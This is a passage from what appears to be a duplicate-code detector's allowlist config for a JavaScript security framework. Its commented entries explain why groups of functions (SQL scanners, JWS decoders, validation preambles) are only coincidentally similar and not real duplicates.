      // stripping the query string, in the well-known-resource / upload
      // middlewares (assetlinks / security-txt / web-app-manifest / tus-upload).
      // The req.url indexOf("?")/slice shape coincides; each middleware then
      // dispatches its own routes. (requestHelpers.makeSkipMatcher already strips
      // queries for the guard skip-path case; these are full request dispatchers,
      // not skip predicates.)
      mode:  "family-subset",
      files: [
        "lib/middleware/assetlinks.js:create",
        "lib/middleware/security-txt.js:create",
        "lib/middleware/tus-upload.js:_handleDelete",
        "lib/middleware/web-app-manifest.js:create",
      ],
    },
    {
      // SQL char-walk skeleton — shape-only. `var i = 0; var n = sql.length;
      // while (i < n) { var ch = sql.charAt(i); var next = i + 1 < n ? sql.charAt(
      // i + 1) : ""; if (<quote/comment state>) … i += … }` — the quote- and
      // comment-aware single-pass scan over a SQL string, the b.sql/safeSql
      // convention. The members do DIFFERENT per-char work over that one
      // skeleton: countPlaceholders counts `?`, toPositional rewrites `?`→`$N`,
      // assertSingleStatement / assertNoRawStringLiteral / guard-sql's embedded-
      // literal detect / sql.js's jsonb-key-op reject all throw/return — the
      // per-char operation is divergent, so no further unification is possible.
      // (The ONE byte-identical pair that DID hide here — cluster-storage
      // placeholderize == sql._toPositional, the full ?→$N converter — was a
      // genuine dup this comment previously mislabeled "no two bodies are byte-
      // identical"; it is now extracted to safeSql.toPositional, so placeholderize
      // delegates and _toPositional is a one-line alias. The remaining bodies are
      // genuinely shape-only.)
      mode:  "family-subset",
      files: [
        "lib/guard-sql.js:_hasEmbeddedStringLiteral",
        "lib/safe-sql.js:assertNoRawStringLiteral",
        "lib/safe-sql.js:assertSingleStatement",
        "lib/safe-sql.js:countPlaceholders",
        "lib/safe-sql.js:toPositional",
        "lib/sql.js:_assertNoRawJsonbKeyOp",
      ],
    },
    {
      // optional positive-int validation idiom — shape-only (numericBounds
      // sub-finding). `if (opts.<n> !== undefined && (typeof opts.<n> !== "number"
      // || !isFinite(opts.<n>) || opts.<n> <= 0 || Math.floor(opts.<n>) !==
      // opts.<n>)) throw <OwnError>(…)` — the positive-finite-int guard on an
      // optional opt. Recurs in http-client-cache memoryStore, http-client
      // download/upload opts, retention rule validation — the SAME numericBounds-
      // re-roll flagged in the standing-order focused-turn finding (these should
      // route through numericBounds.requirePositiveFiniteIntIfPresent, but each
      // throws via a different mechanism — _hcErr / new Error / own class — so
      // it needs the per-caller error adaptation). Shape-only pending that turn.
      mode:  "family-subset",
      files: [
        "lib/http-client-cache.js:memoryStore",
        "lib/http-client.js:_validateDownloadOpts",
        "lib/http-client.js:_validateUploadOpts",
        "lib/retention.js:_validateRule",
      ],
    },
    {
      // db-family config-time-validation token coincidence — shape-only.
      // fp:fc8a3abc5c74 clusters four UNRELATED db functions: db.init and
      // db.stream (the streamLimit positive-finite-int cascade), external-db
      // ._connectAs (the same cascade on statementTimeoutMs), and db-query
      // ._assertLocalResidency (a per-row residency-tag assertion — no numeric
      // check at all). They share NO byte-identical lines (verified: longest
      // common raw run across the four = 2 lines; _assertLocalResidency shares
      // ZERO). The fingerprint matches only the TOKENIZED `if (typeof X …) throw
      // new DbError(<code>, <msg>)` config-time-validation skeleton — different
      // operations, different error codes/messages/fields. Not extractable; the
      // positive-int cascades that DO recur are the opt-in numericBounds
      // sub-finding above, kept per-caller for their divergent error mechanisms.
      mode:  "family-subset",
      files: [
        "lib/db-query.js:_assertLocalResidency",
        "lib/db.js:init",
        "lib/db.js:stream",
        "lib/external-db.js:_connectAs",
      ],
    },
    // ---- Coincidental-idiom token clusters — shape-only. Each groups
    // unrelated functions that share only a TOKENIZED skeleton (validate-
    // then-throw / build-object / scan-buffer / emit-audit), NOT real logic.
    // Every one verified to share < 5 byte-identical lines across members
    // (the .scratch/one-cluster.js + firing-worklist.js longest-common-raw-run
    // cross-check — the same check that surfaced the genuine SQL toPositional
    // dup at run=16); the function names alone show the divergence.
    {
      // fp:fe21be189e22 — set-union / EU-AI-Act classify / mail-store match:
      // zero meaningful shared lines (max run = 1).
      mode: "family-subset",
      files: ["lib/agent-posture-chain.js:_union", "lib/compliance-ai-act.js:classify", "lib/mail-store.js:addMatch"],
    },
    {
      // fp:ee94d15751da — audit cluster-query / CIBA start / OAuth end-session
      // URL / OAuth token exchange: unrelated request builders (run = 1).
      mode: "family-subset",
      files: ["lib/audit.js:_queryCluster", "lib/auth/ciba.js:startAuthentication", "lib/auth/oauth.js:endSessionUrl", "lib/auth/oauth.js:exchangeToken"],
    },
    {
      // fp:fb3dc0590fac — sanctions-fetcher create / outbox create / VAPID auth
      // header build: unrelated factories (run = 1).
      mode: "family-subset",
      files: ["lib/compliance-sanctions-fetcher.js:create", "lib/outbox.js:create", "lib/web-push-vapid.js:buildVapidAuthHeader"],
    },
    {
      // fp:68981fcd2fb8 — orchestrator create / Cloudflare-challenge parse /
      // ws connect: unrelated (run = 1).
      mode: "family-subset",
      files: ["lib/agent-orchestrator.js:create", "lib/auth/bot-challenge.js:_parseCloudflareLike", "lib/ws-client.js:connect"],
    },
    {
      // fp:b5fe197c216a — CA-input normalize / compiled-route match / sandbox
      // allowlist validate: unrelated (run = 0).
      mode: "family-subset",
      files: ["lib/network-tls.js:_normalizeCaInput", "lib/router.js:_matchCompiled", "lib/sandbox.js:_validateAllowed"],
    },
    {
      // fp:a91bdf67f117 — A2A card-shape validate / ACME CSR build / mail-move
      // guard validate: unrelated (run = 0).
      mode: "family-subset",
      files: ["lib/a2a.js:_validateCardShape", "lib/acme.js:buildCsr", "lib/guard-mail-move.js:validate"],
    },
    {
      // fp:2b3fe6249cf4 — db init / EAT verify / cookie-jar getAll: unrelated (run = 0).
      mode: "family-subset",
      files: ["lib/db.js:init", "lib/eat.js:verify", "lib/http-client-cookie-jar.js:getAll"],
    },
    {
      // fp:a3451562b331 — JAR parse / status-list fromJwt / EAT verify: unrelated (run = 0).
      mode: "family-subset",
      files: ["lib/auth/jar.js:parse", "lib/auth/status-list.js:fromJwt", "lib/eat.js:verify"],
    },
    {
      // fp:9d3b9d7485a8 — HAL link-normalize / Auth-Results emit / template create:
      // unrelated (run = 0).
      mode: "family-subset",
      files: ["lib/hal.js:_normaliseLinks", "lib/mail-auth.js:authResultsEmit", "lib/template.js:create"],
    },
    {
      // fp:37504a27507f — DKIM merge / MDN boundary-gen / watcher auto-mode detect:
      // unrelated (run = 0).
      mode: "family-subset",
      files: ["lib/mail-dkim.js:_merge", "lib/mail-mdn.js:_generateBoundary", "lib/watcher.js:_detectAutoMode"],
    },
    {
      // fp:f663cba2cf0e — importmap build / JMAP emailSubmission/set / security-
      // headers create: unrelated (run = 0).
      mode: "family-subset",
      files: ["lib/importmap-integrity.js:build", "lib/mail-server-jmap.js:emailSubmissionSetHandler", "lib/middleware/security-headers.js:create"],
    },
    {
      // fp:35e58265837c — AI-DP budget / DSA notice-and-action / privacy vendor
      // review: unrelated (run = 2).
      mode: "family-subset",
      files: ["lib/ai-dp.js:budget", "lib/dsa.js:noticeAndAction", "lib/privacy.js:vendorReview"],
    },
    {
      // fp:d81fda969cdc — agent-stream create / SD-JWT-VC issue / makeByteCoercer:
      // unrelated (run = 1).
      mode: "family-subset",
      files: ["lib/agent-stream.js:create", "lib/auth/sd-jwt-vc-issuer.js:issue", "lib/safe-buffer.js:makeByteCoercer"],
    },
    {
      // fp:5c6ec6d47559 — three independent `_tick` interval callbacks (db prune /
      // TLS cert-watch / NTP poll): same name, divergent bodies (run = 2).
      mode: "family-subset",
      files: ["lib/db.js:_tick", "lib/network-tls.js:_tick", "lib/ntp-check.js:_tick"],
    },
    {
      // fp:e82170afdef0 — ICAP / MIME / SMTP header-boundary finders: each scans
      // for its own delimiter (ICAP null-line / MIME blank-line / SMTP dot-CRLF)
      // with a different byte-walk (run = 1) — not a shared scanner.
      mode: "family-subset",
      files: ["lib/safe-icap.js:_findHeaderEnd", "lib/safe-mime.js:_findHeaderBodySep", "lib/safe-smtp.js:findDotTerminator"],
    },
    {
      // fp:448fd0aeb14b — agent-idempotency / agent-orchestrator `_safeAudit` +
      // redis frame-decode: the two `_safeAudit` share NO lines (run = 0,
      // different audit shapes), redis is unrelated.
      mode: "family-subset",
      files: ["lib/agent-idempotency.js:_safeAudit", "lib/agent-orchestrator.js:_safeAudit", "lib/redis-client.js:_frameToValue"],
    },
    // ---- run<=1 coincidental-idiom token clusters — shape-only. Each shares
    // <= 1 byte-identical line across all members (firing-worklist longest-
    // common-raw-run); the function names are unrelated operations that merely
    // tokenize to the same validate/build/parse/emit skeleton. Verified per fp.
    { mode: "family-subset", files: ["lib/auth/fido-mds3.js:_parseJws", "lib/backup/index.js:create", "lib/dsr.js:create"] },                                           // fp:9933f4c825d7
    { mode: "family-subset", files: ["lib/guard-trace-context.js:<top>", "lib/guard-uuid.js:<top>", "lib/observability.js:_emit"] },                                    // fp:3a733fe6d5e0
    { mode: "family-subset", files: ["lib/compliance-ai-act-prohibited.js:getPractice", "lib/compliance-ai-act-risk.js:getAnnexIII", "lib/guard-all.js:_byName"] },     // fp:7b2066d1272f
    { mode: "family-subset", files: ["lib/auth/bot-challenge.js:verify", "lib/backup/index.js:create", "lib/db.js:declareRequireDualControl"] },                         // fp:c8a56301a5b9
    { mode: "family-subset", files: ["lib/auth/passkey.js:_validateExpectedOrigin", "lib/network-tls.js:buildOptions", "lib/redact.js:classifyDefaults"] },             // fp:aeee2abf8cfa
    { mode: "family-subset", files: ["lib/json-path.js:_Parser", "lib/parsers/safe-ini.js:_unquote", "lib/template.js:_tokenizeExpr"] },                                 // fp:d5d4e349a51d
    { mode: "family-subset", files: ["lib/auth/oauth.js:_validateAuthorizationDetailsArray", "lib/auth/step-up.js:parseAuthorizationDetails", "lib/middleware/speculation-rules.js:_validateRules"] }, // fp:cb9b5f041e5a
    { mode: "family-subset", files: ["lib/cloud-events.js:parse", "lib/guard-mail-query.js:validateActor", "lib/mail-arf.js:parse"] },                                   // fp:838d24eb77d0
    { mode: "family-subset", files: ["lib/dsa.js:statementOfReasons", "lib/observability-tracer.js:create", "lib/redact.js:installOutboundDlp"] },                      // fp:8dee337bcf0c
    { mode: "family-subset", files: ["lib/break-glass.js:_validatePolicySet", "lib/external-db.js:assertRoleHardening", "lib/mail-deploy.js:mtaStsPublish"] },           // fp:ca61e9ab6b11
    { mode: "family-subset", files: ["lib/guard-idempotency-key.js:validate", "lib/guard-mail-sieve.js:_checkName", "lib/guard-tenant-id.js:validate"] },                // fp:08be5fe28966
    { mode: "family-subset", files: ["lib/ai-dp.js:mechanism", "lib/config.js:loadDbBacked", "lib/guard-snapshot-envelope.js:validate"] },                              // fp:154c379ea24b
    { mode: "family-subset", files: ["lib/dsa.js:statementOfReasons", "lib/dsr.js:create", "lib/middleware/span-http-server.js:create"] },                              // fp:e9b161fb9c9a
    { mode: "family-subset", files: ["lib/agent-orchestrator.js:_spawnConsumers", "lib/cra-report.js:conformityAssessment", "lib/mail-agent.js:consumer"] },             // fp:13663a1ab4d4
    { mode: "family-subset", files: ["lib/crypto-field.js:declarePerRowKey", "lib/mail-crypto-pgp.js:sign", "lib/metrics.js:shadowRegistry"] },                          // fp:8c85b5387e01
    { mode: "family-subset", files: ["lib/dsr.js:submit", "lib/mail-crypto-smime.js:_verifySignerInfo", "lib/self-update.js:poll", "lib/self-update.js:verify"] },       // fp:6fdcd6278c3f
    { mode: "family-subset", files: ["lib/guard-archive.js:validateEntries", "lib/guard-filename.js:sanitize", "lib/guard-sql.js:_firstRefusal"] },                      // fp:473b194a846b
    { mode: "family-subset", files: ["lib/auth/oauth.js:exchangeToken", "lib/auth/oauth.js:nativeSsoExchange", "lib/backup/index.js:scheduleTest", "lib/restore-rollback.js:rollback"] }, // fp:bde9e82cd35d
    { mode: "family-subset", files: ["lib/break-glass.js:policyGet", "lib/outbox.js:_processOnce", "lib/queue-local.js:dlqList"] },                                      // fp:eed55a803a01
    { mode: "family-subset", files: ["lib/compliance-ai-act.js:annexIVScaffold", "lib/gate-contract.js:defineGate", "lib/mail-auth.js:_shapeAggregateReport"] },         // fp:85b35a95f706
    { mode: "family-subset", files: ["lib/auth/oauth.js:exchangeToken", "lib/auth/oauth.js:nativeSsoExchange", "lib/auth/oid4vci.js:createCredentialOffer", "lib/restore-rollback.js:rollback"] }, // fp:7e2dec1b32fe
    { mode: "family-subset", files: ["lib/ddl-change-control.js:create", "lib/network.js:_setSocketKeepAlive", "lib/webhook.js:sign"] },                                 // fp:357ed29a698c
    { mode: "family-subset", files: ["lib/guard-filename.js:_detectIssues", "lib/guard-json.js:_scanRawSource", "lib/guard-xml.js:_detectIssues"] },                     // fp:c12b152988e3
    { mode: "family-subset", files: ["lib/auth/sd-jwt-vc.js:verify", "lib/dsr.js:submit", "lib/network-smtp-policy.js:tlsRptParseReport"] },                             // fp:e46648c664ec
    { mode: "family-subset", files: ["lib/ai-quota.js:_validateStore", "lib/middleware/tus-upload.js:create", "lib/pagination.js:cursor", "lib/pagination.js:offset"] }, // fp:6a46f9f2e924
    { mode: "family-subset", files: ["lib/auth/dpop.js:thumbprint", "lib/breach-deadline.js:trackReport", "lib/incident-report.js:track"] },                            // fp:8ab2aaeadd82
    { mode: "family-subset", files: ["lib/breach-deadline.js:get", "lib/gdpr-ropa.js:get", "lib/incident-report.js:get"] },                                             // fp:5df6f6051d06
    { mode: "family-subset", files: ["lib/a2a.js:_validateCardShape", "lib/calendar.js:validate", "lib/middleware/assetlinks.js:create"] },                              // fp:7aa9b33469df
    { mode: "family-subset", files: ["lib/guard-jwt.js:kidSafe", "lib/guard-mail-move.js:_checkFolderName", "lib/mail-rbl.js:_validateZoneNames"] },                     // fp:d165183e0fa5
    { mode: "family-subset", files: ["lib/ai-dp.js:mechanism", "lib/dora.js:_validateReportInput", "lib/guard-snapshot-envelope.js:validate"] },                        // fp:b0dceb3bd2fe
    { mode: "family-subset", files: ["lib/auth/sd-jwt-vc-issuer.js:create", "lib/fsm.js:define", "lib/mail.js:_validateMessage"] },                                      // fp:dff4eab2b4e0
    { mode: "family-subset", files: ["lib/csp.js:_parsePermissionsPolicyString", "lib/http-message-signature.js:_parseSignatureInput", "lib/network-tls.js:_parseSanString"] }, // fp:c998d327f9c0
    { mode: "family-subset", files: ["lib/middleware/idempotency-key.js:resealMigrate", "lib/object-store/http-request.js:promiseToStream", "lib/validate-opts.js:observabilityShape"] }, // fp:824f10cf9f10 (was notModifiedGetResult/fp:711a58281dd7 before promiseToStream landed adjacent — coincidental object-literal/return shingle across 3 unrelated fns)
    { mode: "family-subset", files: ["lib/auth/sd-jwt-vc-issuer.js:create", "lib/guard-saga-config.js:validate", "lib/network-heartbeat.js:_validateTarget"] },          // fp:c8f43d4d1941
    { mode: "family-subset", files: ["lib/auth/oauth.js:deviceAuthorization", "lib/auth/oauth.js:parseCallback", "lib/ddl-change-control.js:_hashSql", "lib/mail-rbl.js:query"] }, // fp:882fd32d8e11
    { mode: "family-subset", files: ["lib/auth/oid4vp.js:matchDcql", "lib/gate-contract.js:_ctxValueForKind", "lib/http-message-signature.js:_parseUrl"] },              // fp:726ed545b065
    { mode: "family-subset", files: ["lib/archive-adapters.js:close", "lib/crypto-field.js:listPerRowResidency", "lib/tracing.js:spanSync"] },                           // fp:c4617588ed77
    { mode: "family-subset", files: ["lib/backup/bundle.js:create", "lib/mail-greylist.js:check", "lib/safe-buffer.js:makeByteCoercer"] },                               // fp:d4c06878dcda
    { mode: "family-subset", files: ["lib/breach-deadline.js:trackReport", "lib/guard-snapshot-envelope.js:validate", "lib/incident-report.js:open"] },                  // fp:d7d8a89732c8
    // Proto-shadow hardening converged these allowlist gates onto the framework's
    // canonical `!Object.prototype.hasOwnProperty.call(MAP, key)` membership idiom
    // (the 312-use convention), which pushed the shared validation preamble past
    // the 50-token shingle. Shape-only: the maps, error classes, codes, and
    // messages diverge per domain (mail-spam-score lists the valid profiles in
    // its bad-profile message; guard-envelope does not — a deliberate per-caller
    // choice, see gate-contract.resolveProfileName which owns only the resolution
    // expression and leaves each caller its bespoke typed throw).
    { mode: "family-subset", files: ["lib/guard-envelope.js:check", "lib/mail-greylist.js:create", "lib/mail-helo.js:evaluate", "lib/mail-rbl.js:create", "lib/mail-scan.js:create", "lib/mail-spam-score.js:create"] }, // fp:958143c0319d (was fp:59fd2e7ac678 before mail-scan's profile gate joined)
    { mode: "family-subset", files: ["lib/mail-journal.js:_validateRegimes", "lib/middleware/tus-upload.js:create", "lib/safe-sieve.js:_parseCommand"] },                  // fp:2524f7ddf5a1
    { mode: "family-subset", files: ["lib/breach-deadline.js:open", "lib/breach-deadline.js:trackReport", "lib/cms-codec.js:encodeEnvelopedData", "lib/cms-codec.js:encodeSignedData", "lib/mail-deploy.js:mtaStsPublish"] }, // fp:32fba36fb64e
    {
      // presigned-policy expiry-range validation + structure — shape-only. `var
      // ttl = opts.expiresIn != null ? opts.expiresIn : <default>; if (typeof ttl
      // !== "number" || ttl < <min> || ttl > <max>) throw <Error>(…, true); …
      // build a V4 POST policy` — the GCS and SigV4 presigned-upload-policy
      // builders share the expiry-range guard + POST-policy structure (GCS even
      // REUSES sigv4.formatAmzDate / formatDateStamp), but the credential scope +
      // signing diverge per provider (goog4_request + serviceAccount vs
      // aws4_request + accessKeyId) and the cap message differs. Azure SAS shares
      // only the range guard. The provider-specific signing is not extractable.
      mode:  "family-subset",
      files: [
        "lib/object-store/azure-blob.js:_buildSasToken",
        "lib/object-store/gcs.js:presignedUploadPolicy",
        "lib/object-store/sigv4.js:presignedUploadPolicy",
      ],
    },
    {
      // middleware _emitAudit wrapper — shape-only. `function _emitAudit(action,
      // outcome, …) { if (!audit || typeof audit.<m> !== "string") return; try {
      // audit.<emit>({ event: action, outcome: …, metadata: … }); } catch {} }` —
      // the per-middleware drop-silent audit emitter. Different md5 across
      // cookies / gpc / headers (each builds a different audit payload); the
      // heterogeneous _emitAudit family (the genuine namespaced / verbatim-gated /
      // metadata-first emitters are already extracted to b.audit.namespaced /
      // auditEmit.emit; these three keep their own shape).
      mode:  "family-subset",
      files: [
        "lib/middleware/cookies.js:_emitAudit",
        "lib/middleware/gpc.js:_emitAudit",
        "lib/middleware/headers.js:_emitAudit",
      ],
    },
    {
      // API-document field-validation collect idiom — shape-only. `if (typeof
      // doc.<f>.<g> !== "string" || doc.<f>.<g>.length === 0) { errors.push(<msg>);
      // } if (typeof doc.<f>.<h> !== "string" || …) { errors.push(<msg>); } …` —
      // collecting field-validation messages while walking an API/manifest doc.
      // asyncapi.parse and openapi.parse SHARE A NAME but validate DIFFERENT
      // schemas (AsyncAPI vs OpenAPI), and backup-manifest validates a backup
      // doc — different fields, not byte-identical. The push-error-per-bad-field
      // shape coincides; the schema is domain-specific.
      mode:  "family-subset",
      files: [
        "lib/asyncapi.js:parse",
        "lib/backup/manifest.js:validate",
        "lib/openapi.js:parse",
      ],
    },
    {
      // requireNonEmptyString + byte-cap preamble — shape-only. `if (typeof name
      // !== "string" || name.length === 0) throw <OwnError>(<code>, <msg> + name);
      // if (Buffer.byteLength(name, "utf8") > <cap>) throw <OwnError>(…); …` — the
      // non-empty-string check followed by a UTF-8 byte-cap, in identifier/field
      // validators (mail-move folder-name, posture-chain, spam-reason). Divergent
      // caps + error classes; char-empty + byteLength, not the byte-cap-on-string
      // bug class (Buffer.byteLength is correct here).
      mode:  "family-subset",
      files: [
        "lib/guard-mail-move.js:_checkFolderName",
        "lib/guard-posture-chain.js:validate",
        "lib/mail-spam-score.js:_sanitizeReasons",
      ],
    },
    {
      // parser opts-validation preamble — shape-only. `opts = opts || {}; if (
      // opts.<x> !== undefined && !<valid>(opts.<x>)) throw <OwnError>(<msg> +
      // opts.<x>, <code>); if (opts.<y> !== undefined && …) throw …` — validating
      // each optional parser knob if present. safe-env / safe-toml / safe-yaml
      // .parse share the if-defined-validate-throw SHAPE but validate DIFFERENT
      // per-format opts (env line caps vs TOML depth vs YAML anchors) with their
      // OWN error class — not byte-identical (verified).
      mode:  "family-subset",
      files: [
        "lib/parsers/safe-env.js:parse",
        "lib/parsers/safe-toml.js:parse",
        "lib/parsers/safe-yaml.js:parse",
      ],
    },
    {
      // object-input + requireNonEmptyString preamble — shape-only. `function _<x>(
      // input) { if (!input || typeof input !== "string") throw <OwnError>(…); if
      // (!input.<f> || typeof input.<f>.<g> !== "string") throw <OwnError>(…); … }`
      // — the b5f63d71b320 data-input preamble. Recurs across CRA conformity
      // assessment, mail-agent consumer, mail-journal — divergent fields + error
      // classes; not the opts-contract validateOpts governs.
      mode:  "family-subset",
      files: [
        "lib/cra-report.js:conformityAssessment",
        "lib/mail-agent.js:consumer",
        "lib/mail-journal.js:create",
      ],
    },
    {
      // file-op opts-default + path preamble — shape-only. `async function _<x>(
      // opts) { var now = Date.now(); opts = opts || {}; if (typeof opts.<path>
      // !== "string" || !<valid>(opts.<path>)) throw <OwnError>(…); … }` — the
      // bundle/rotate file operations open with an opts-default + path-string
      // validation. Recurs across backup-bundle create, restore-bundle extract,
      // vault key rotation — divergent path fields + error classes. (The shared
      // fd read-loop these wrap is the separately-tracked fdSafeReadSync genuine
      // candidate; this preamble is shape-only.)
      mode:  "family-subset",
      files: [
        "lib/backup/bundle.js:create",
        "lib/restore-bundle.js:extract",
        "lib/vault/rotate.js:rotate",
      ],
    },
    {
      // char-code charset-validation scan — shape-only. `for (var i = 0; i <
      // s.length; i += 1) { var c = s.charCodeAt(i); if (c < <lo> || c > <hi> ||
      // …) throw/return <bad>; }` — scanning a string and validating each code
      // point against a per-field allowed range. Recurs across guard-jwt kid
      // charset, mail-move folder-name, message-id, spam-reason sanitization —
      // each with its OWN allowed code-point set + disposition. (The control-char
      // C0/DEL scan was extracted to codepointClass.firstControlCharOffset; these
      // validate DIFFERENT, field-specific charsets, not the control-char floor.)
      mode:  "family-subset",
      files: [
        "lib/cookies.js:parseSafe",
        "lib/guard-jwt.js:kidSafe",
        "lib/guard-mail-move.js:_checkFolderName",
        "lib/guard-message-id.js:validate",
        "lib/mail-spam-score.js:_sanitizeReasons",
        "lib/middleware/headers.js:_detectIssues",
        "lib/request-helpers.js:extractBearer",
        "lib/router.js:_matchCompiled",
      ],
    },
    {
      // iterate-array-field string-element validation — shape-only. `for (var i =
      // 0; i < obj.<arr>.length; i += 1) { var el = obj.<arr>[i]; if (typeof el
      // !== "string" || el.length === 0) throw/skip; … }` — validating each
      // string element of an object'\''s array field. Recurs across guard validate
      // (mail-move / posture-chain), ARC evaluation, JMAP submission handling —
      // divergent fields, dispositions, error classes.
      mode:  "family-subset",
      files: [
        "lib/guard-mail-move.js:validate",
        "lib/guard-posture-chain.js:validate",
        "lib/mail-auth.js:arcEvaluate",
        "lib/mail-server-jmap.js:emailSubmissionSetHandler",
      ],
    },
    {
      // Object.keys transform-iteration idiom — shape-only. `var out = {}; var
      // keys = Object.keys(src); for (var i = 0; i < keys.length; i += 1) { var k
      // = keys[i]; var v = src[k]; … out[…] = …; }` — iterating an object'\''s own
      // keys to build a transformed object. Recurs across ACME profile listing,
      // HAL link normalisation, JMAP back-reference resolution, template building
      // — each with a different per-entry transform. The Object.keys loop is the
      // primitive; the body is domain-specific.
      mode:  "family-subset",
      files: [
        "lib/acme.js:listProfiles",
        "lib/hal.js:_normaliseLinks",
        "lib/mail-server-jmap.js:_resolveBackRefs",
        "lib/template.js:create",
      ],
    },
    {
      // surrounding-quote / delimiter strip idiom — shape-only. `s = s.trim();
      // if (s.length >= 2 && s.charAt(0) === <q> && s.charAt(s.length - 1) === <q>)
      // { s = s.slice(1, -1); … }` — peeling a paired delimiter (quotes / angle
      // brackets) off a parsed token. Recurs across unrelated parsers (step-up
      // challenge, cookie value, TLS IP-for-compare, MIME content-type /
      // filename) each stripping its own delimiter as part of a larger
      // domain-specific parse. The charAt-first/last + slice SHAPE coincides; the
      // surrounding parser is per-format.
      mode:  "family-subset",
      files: [
        "lib/auth/step-up.js:parseChallenge",
        "lib/cookies.js:parse",
        "lib/cookies.js:parseSafe",
        "lib/network-tls.js:_normalizeIpForCompare",
        "lib/safe-mime.js:_filenameFromHeaders",
        "lib/safe-mime.js:_parseContentType",
      ],
    },
    {
      // Optional-Date validation idiom — shape-only. `if (opts.<t> !== undefined
      // && opts.<t> !== null) { if (!(opts.<t> instanceof Date) || !isFinite(
      // opts.<t>.getTime())) throw <OwnError>(<ownCode>, <msg>); }` — validating
      // an optional verification-time Date opt. Recurs across the credential /
      // signature verify paths (mDoc issuer-signed, DNSSEC RRset, RFC 3161 TSA
      // token, VC) — different verifications, the SAME instanceof-Date + finite-
      // getTime guard, each with its OWN error class + code + message. There is
      // no validateOpts.optionalDate helper today; this generic Date-shape guard
      // with divergent error contracts is the requireNonEmptyString-class case
      // (routing through one helper would normalise the message + swap the class).
      mode:  "family-subset",
      files: [
        "lib/mdoc.js:verifyIssuerSigned",
        "lib/network-dnssec.js:verifyRrset",
        "lib/tsa.js:verifyToken",
        "lib/vc.js:verify",
      ],
    },
    {
      // JOSE auth verify / decode / sign family — shape-only. The compact-JWS
      // sign/verify paths across the auth modules share several generic shingles
      // at once (the split('.')+3-seg+b64url decode, the alg→param verify-opts
      // assembly, the node:crypto verify call, the try/catch rethrow-as-typed-
      // error), so a single cluster spans MULTIPLE of these functions across the
      // file set — no single shape-entry covers a mixed cluster. This family
      // entry enumerates the JOSE functions so a cluster's whole mixed site set
      // is covered. Each piece is independently shape-only and was adjudicated by
      // the prior JOSE pass: the GENUINE shared atom (the alg→param TABLE) is
      // already extracted to jwtExternal.algParams; the decode, the verify-opts
      // assembly, the node:crypto.verify and the catch-rethrow stay per-caller
      // because they diverge (PQC/EdDSA bare-key vs classical {key}, sign vs
      // verify, per-segment maxBytes, distinct error classes). No two bodies are
      // byte-identical.
      mode:  "family-subset",
      files: [
        "lib/auth/dpop.js:buildProof",
        "lib/auth/dpop.js:verify",
        "lib/auth/fido-mds3.js:_parseJws",
        "lib/auth/fido-mds3.js:_verifyJws",
        "lib/auth/jwt.js:decode",
        "lib/auth/jwt-external.js:_fetchJwks",
        "lib/auth/jwt-external.js:_signCompactJws",
        "lib/auth/jwt-external.js:verifyExternal",
        "lib/auth/oauth.js:_verifyAttestationJws",
        "lib/auth/oauth.js:verifyIdToken",
        "lib/auth/oid4vci.js:_verifyProofJwt",
        "lib/auth/openid-federation.js:parseEntityStatement",
        "lib/auth/saml.js:_verifyEmbeddedXmlDsig",
        "lib/auth/saml.js:parseLogoutRequest",
        "lib/auth/saml.js:parseLogoutResponse",
        "lib/mail-auth.js:inboundVerify",
        "lib/network-smtp-policy.js:tlsRptParseReport",
      ],
    },
    {
      // JWS compact-decode idiom — shape-only. `var parts = token.split("."); if
      // (parts.length !== 3) throw <OwnError>; var header = JSON.parse(b64url(
      // parts[0])); if (…) throw; …` — splitting a compact JWS / JWT into its 3
      // segments and b64url-decoding the header/payload. jwt.decode owns the
      // canonical form, but the auth callers diverge MATERIALLY and do NOT route
      // cleanly through it: fido-mds3._parseJws adds per-segment maxBytes caps +
      // x5c-array checks and returns `sig` (not `signature`); dpop / oid4vci /
      // openid-federation each carry their OWN error class + code + extra header
      // assertions. Only the split('.')+3-seg+b64url SHAPE coincides; the
      // per-caller validation and error contracts diverge (the prior JOSE pass
      // extracted the shared alg→param table as jwtExternal.algParams and
      // deliberately left the decode per-caller). No two decode bodies are
      // byte-identical.
      mode:  "family-subset",
      files: [
        "lib/auth/dpop.js:verify",
        "lib/auth/fido-mds3.js:_parseJws",
        "lib/auth/jwt.js:decode",
        "lib/auth/oid4vci.js:_verifyProofJwt",
        "lib/auth/openid-federation.js:parseEntityStatement",
      ],
    },
    {
      // try/catch rethrow-as-typed-error idiom — shape-only. `try { <verify> }
      // catch (e) { throw new <OwnError>(<ownCode>, <msg> + ((e && e.message) ||
      // String(e))); } if (!<result>) { throw new <OwnError>(…) }` — wrapping a
      // crypto / XML / parse step and rethrowing the failure as the module's own
      // typed framework error with the original message appended. Recurs across
      // the auth verify paths (fido-mds3 JWS verify, jwt-external verifyExternal,
      // oauth ID-token verify, oid4vci proof verify, saml XML-DSig + logout
      // parsing) — each over a DIFFERENT verification step (RSA/ECDSA signature
      // vs XML canonicalisation vs JWT decode) with its OWN error class + code +
      // message. The `(e && e.message) || String(e)` safe-message extraction is a
      // generic JS error-handling idiom (the tuned-out language-idiom tier). The
      // coincidental try/catch-rethrow shape, divergent verify bodies and error
      // contracts — no shared primitive.
      mode:  "family-subset",
      files: [
        "lib/auth/fido-mds3.js:_verifyJws",
        "lib/auth/jwt-external.js:verifyExternal",
        "lib/auth/oauth.js:verifyIdToken",
        "lib/auth/oid4vci.js:_verifyProofJwt",
        "lib/auth/saml.js:_verifyEmbeddedXmlDsig",
        "lib/auth/saml.js:parseLogoutRequest",
        "lib/auth/saml.js:parseLogoutResponse",
      ],
    },
    {
      // false / object / default config-normalization idiom — shape-only. `if
      // (opts.<x> === false) { cfg = <off>; } else if (opts.<x> && typeof
      // opts.<x>.<y> === "string") { cfg = opts.<x>; } else { cfg = <derive>; }`
      // — the three-way "disabled / explicit-object / derive-default" option
      // normalization. Recurs across create() factories over entirely different
      // options: mail-server guardDomain profiles, the OTLP exporter's transport
      // config, the outbox's retry/store config, POP3 server setup. Coincidental
      // three-branch shape; the option, the off/derive values and the surrounding
      // factory are domain-specific with no shared primitive.
      mode:  "family-subset",
      files: [
        "lib/mail-server-imap.js:create",
        "lib/mail-server-pop3.js:create",
        "lib/mail-server-managesieve.js:create",
        "lib/mail-server-submission.js:create",
        "lib/mail-server-mx.js:create",
        "lib/observability-otlp-exporter.js:create",
        "lib/outbox.js:create",
      ],
    },
    {
      // db-declare _validateOpts preamble — shape-only. The DDL declare factories
      // (declareRowPolicy / declareView) and role/legal-hold helpers open with
      // the same exhaustive-opts + requireNonEmptyString preamble, but validate
